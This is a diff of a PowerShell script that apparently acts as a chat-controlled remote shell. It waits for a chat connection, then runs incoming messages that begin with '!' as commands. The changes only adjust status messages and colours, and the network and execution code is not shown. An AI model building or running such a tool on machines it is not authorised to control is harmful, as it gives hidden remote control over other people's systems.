@@ -14,7 +14,8 @@ Write-Host '  \/_/ /_/    \/_____/    \/_/  \/_/    \/_____/      \/_/      \/__
 Write-Host ''
 Write-Host '====================================================================================================================================' -ForegroundColor Green
 Write-Host ''
-Write-Host '[*] Status: Establishing Connection...' -ForegroundColor Yellow
+Write-Host '[-] Status: Establishing Connection...' -ForegroundColor Green
+Write-Host ''
 $chatId = $null
 while (-not $chatId) {
     try {
@@ -27,6 +28,7 @@ while (-not $chatId) {
 }
 
 Write-Host "[+] Connected! Chat ID: $chatId" -ForegroundColor Green
+Write-Host ''
 $lastUpdateId = 0
 
 while ($true) {
@@ -42,7 +44,7 @@ while ($true) {
                 
                 if ($msgText -and $msgText.StartsWith('!')) {
                     $cmd = $msgText.Substring(1)
-                    Write-Host "[+] Executing: $cmd" -ForegroundColor Magenta
+                    Write-Host "[+] Remote Command: $cmd" -ForegroundColor Blue
                     
                     $output = ""
                     try {
